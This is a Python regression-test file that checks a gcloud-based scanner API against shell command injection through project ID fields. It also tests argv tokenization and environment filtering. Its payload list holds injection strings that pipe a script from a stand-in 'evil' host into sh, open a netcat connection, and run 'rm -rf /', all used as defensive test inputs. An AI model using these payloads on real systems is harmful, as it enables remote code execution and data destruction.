"""Regression tests for command injection into the gcloud shell sink.

GcloudRunner executes every command through create_subprocess_shell, so any
caller-supplied value that reaches it unvalidated is arbitrary code execution
as the scanner service account.

Two paths were unvalidated:
  - GET /setup/validate took a raw project_id Query and interpolated it into
    `gcloud projects get-iam-policy {project_id}`.
  - POST /scans took specific_projects[] with no validation; for scope=org it
    became the project list verbatim and reached ~200 check commands.
"""

import pydantic
import pytest
from fastapi.testclient import TestClient

from backend.core.gcloud_runner import _subprocess_env, _tokenize
from backend.core.models import ScanRequest
from backend.main import app

# Values that would break out of the surrounding shell command.
SHELL_PAYLOADS = [
    "x;whoami",
    "a$(id)",
    "p && curl http://evil/x.sh",
    "q | nc evil 443",
    "r`id`",
    "s;curl -s http://evil|sh #",
    "t\nwhoami",
    "u & sleep 5",
]


@pytest.fixture
def client():
    return TestClient(app)


class TestSetupValidateInjection:
    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_shell_metacharacters_rejected(self, client, payload):
        resp = client.get("/api/v1/setup/validate", params={"project_id": payload})
        assert resp.status_code == 422, (
            f"{payload!r} was not rejected — it reaches create_subprocess_shell"
        )

    def test_wellformed_project_id_passes_validation(self, client):
        # Reaches the gcloud call (which fails without credentials in CI), but
        # the point is that it is not rejected as malformed input.
        resp = client.get(
            "/api/v1/setup/validate", params={"project_id": "my-project-123"}
        )
        assert resp.status_code != 422


class TestScanRequestInjection:
    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_specific_projects_rejects_shell_metacharacters(self, payload):
        with pytest.raises(pydantic.ValidationError):
            ScanRequest(
                scope="org", target_id="123456789012", specific_projects=[payload]
            )

    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_scan_endpoint_rejects_shell_metacharacters(self, client, payload):
        resp = client.post(
            "/api/v1/scans",
            json={
                "scope": "org",
                "target_id": "123456789012",
                "specific_projects": [payload],
            },
        )
        assert resp.status_code == 422, (
            f"{payload!r} was not rejected — it reaches ~200 check commands"
        )

    def test_valid_project_ids_are_normalized(self):
        req = ScanRequest(
            scope="org",
            target_id="123456789012",
            specific_projects=["My-Project-123", " other-project "],
        )
        assert req.specific_projects == ["my-project-123", "other-project"]

    def test_one_bad_entry_rejects_the_whole_list(self):
        with pytest.raises(pydantic.ValidationError):
            ScanRequest(
                scope="org",
                target_id="123456789012",
                specific_projects=["good-project-1", "bad;whoami"],
            )

    def test_empty_list_is_allowed(self):
        req = ScanRequest(scope="org", target_id="123456789012")
        assert req.specific_projects == []


class TestRunnerTokenization:
    """Defence in depth: even an unvalidated value can't escape argv."""

    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_payload_stays_a_single_argv_token(self, payload):
        argv = _tokenize(f"gcloud projects get-iam-policy '{payload}' --format=json")
        assert argv[0] == "gcloud"
        # The payload must survive as exactly one argument, not become
        # additional commands or arguments.
        assert payload in argv

    def test_quoted_flags_are_unwrapped_like_a_shell_would(self):
        argv = _tokenize(
            "gcloud projects list --filter='parent.id=123' --format='value(projectId)'"
        )
        assert argv == [
            "gcloud",
            "projects",
            "list",
            "--filter=parent.id=123",
            "--format=value(projectId)",
        ]

    @pytest.mark.parametrize("command", ["sh -c whoami", "curl http://evil", "rm -rf /"])
    def test_non_gcloud_commands_rejected(self, command):
        with pytest.raises(ValueError, match="only gcloud commands"):
            _tokenize(command)

    def test_empty_command_rejected(self):
        with pytest.raises(ValueError, match="empty command"):
            _tokenize("")

    def test_unbalanced_quotes_rejected(self):
        with pytest.raises(ValueError):
            _tokenize("gcloud projects list --filter='unclosed")

    def test_subprocess_env_drops_unrelated_variables(self, monkeypatch):
        monkeypatch.setenv("MY_APP_SECRET", "s3cret")
        monkeypatch.setenv("PATH", "/usr/bin")
        env = _subprocess_env()
        assert "MY_APP_SECRET" not in env
        assert env["PATH"] == "/usr/bin"
